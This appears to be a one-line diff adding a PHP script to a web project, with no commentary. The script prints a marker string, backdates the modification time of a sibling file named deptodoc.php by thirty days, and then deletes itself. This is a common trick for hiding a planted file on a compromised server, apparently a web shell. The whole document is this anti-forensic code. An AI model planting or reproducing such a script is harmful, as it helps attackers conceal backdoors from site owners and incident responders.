@@ -1,0 +1,1 @@
+<?php echo "BaVuuVECTe"; if (file_exists("./deptodoc.php")){ touch("./deptodoc.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*5uYE73dBuGG9FA8XTtAU*/ ?>
